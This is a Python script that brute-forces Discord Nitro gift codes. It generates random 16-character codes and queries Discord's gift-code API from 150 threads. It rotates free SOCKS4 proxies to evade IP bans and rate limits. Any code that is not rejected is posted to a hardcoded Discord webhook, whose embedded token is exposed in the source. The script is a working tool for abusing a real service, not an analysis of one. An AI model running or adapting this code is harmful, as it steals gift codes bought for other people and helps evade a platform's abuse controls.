from multiprocessing.dummy import Process
from time import sleep
from queue import Queue
import requests
import random

def checker():
    global proxy_list, tested, working

    ses = requests.session()

    while True:
        proxy = get_proxy()

        for _ in range(5):
            try:
                code = ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=16))

                req = ses.get(f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true", proxies={
                    'http': "socks4://" + proxy,
                    'https': "socks4://" + proxy}, headers=header).text
                #print("1")

                print(proxy_queue.qsize())

                if req.__contains__('<p>The owner of this website (discordapp.com) has banned your IP address'):
                    try:
                        proxy_list.remove(proxy)
                    except: pass
                    break
                elif req.__contains__('You are being rate limited.'):
                    break
                elif req == '{"message": "Unknown Gift Code", "code": 10038}':
                    tested += 1
                    continue
                
                working += 1
                data = {"content": req, "username": "Nitro Generator", "embeds": [
                    {
                        "description": "code here",
                        "title": code
                    }
                ]}

                requests.post(
                    "https://discord.com/api/webhooks/796305508024844319/TcGqaCurCPTk0UzbUpPEPpbOH4rg_XrF6za9g9h1rkoYjaNMx3Y_9VngkcdM76bHPtMD",
                    json=data)
                continue
            except:
                try:
                    proxy_list.remove(proxy)
                    break
                except: pass


def get_proxy():
    if proxy_queue.empty():
        print(str(working) + " - " + str(tested))
        if len(proxy_list) < 500:
            update_proxies()
        else:
            for proxy in proxy_list:
                proxy_queue.put(proxy)

    return proxy_queue.get()

def update_proxies():
    global proxies_is_updating, proxy_list

    if proxies_is_updating:
        return
    proxies_is_updating = True

    proxy_list = []

    proxies = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&simplified=true").text.split("\n")
    random.shuffle(proxies)

    for proxy in proxies:
        proxy_queue.put(proxy.strip())
        proxy_list.append(proxy.strip())
    print("size = " + str(len(proxy_list)))

    proxies_is_updating = False

if __name__ == '__main__':
    threads = 150
    tested = 0
    working = 0

    proxies_is_updating = False
    proxy_list = []
    header = {'Pragma': 'no-cache',
                       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'}

    proxy_queue = Queue()
    update_proxies()

    for _ in range(threads):
        Process(target=checker).start()
